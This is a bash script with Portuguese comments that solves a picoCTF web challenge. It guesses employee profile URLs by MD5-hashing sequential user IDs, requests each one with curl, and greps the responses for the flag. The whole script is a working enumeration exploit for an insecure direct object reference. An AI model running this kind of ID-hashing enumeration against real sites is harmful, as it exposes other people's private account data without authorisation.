#!/bin/bash

# Alvo da instância atual do desafio
BASE_URL="http://crystal-peak.picoctf.net:52295"

# O desafio diz que existem cerca de 20 funcionários.
# Vamos testar uma faixa um pouco maior para garantir.
START_ID=2990
END_ID=3050

echo "[*] Testando IDs de $START_ID até $END_ID"
echo "[*] Gerando MD5(id) e acessando /profile/user/<hash>"
echo

for id in $(seq $START_ID $END_ID); do
    # Gera o MD5 do número sem quebra de linha
    hash=$(echo -n "$id" | md5sum | awk '{print $1}')

    # Monta a URL provável do perfil
    url="$BASE_URL/profile/user/$hash"

    # Faz a requisição silenciosa
    response=$(curl -s -L "$url")

    # Se não retornar "User not found", pode ser um perfil válido
    if ! echo "$response" | grep -qi "User not found"; then
        echo "=========================================="
        echo "[+] Possível perfil válido encontrado"
        echo "[+] ID:   $id"
        echo "[+] MD5:  $hash"
        echo "[+] URL:  $url"
        echo

        # Mostra uma versão limpa do HTML/texto para facilitar análise
        echo "$response" | sed 's/<[^>]*>/\n/g' | sed '/^[[:space:]]*$/d' | head -n 80

        # Tenta extrair a flag diretamente
        flag=$(echo "$response" | grep -oE 'picoCTF\{[^}]+\}' | head -n 1)

        if [ -n "$flag" ]; then
            echo
            echo "[FLAG ENCONTRADA] $flag"
            exit 0
        fi
    fi
done

echo
echo "[!] Finalizado. Se não apareceu a flag, me mande a saída dos perfis válidos."
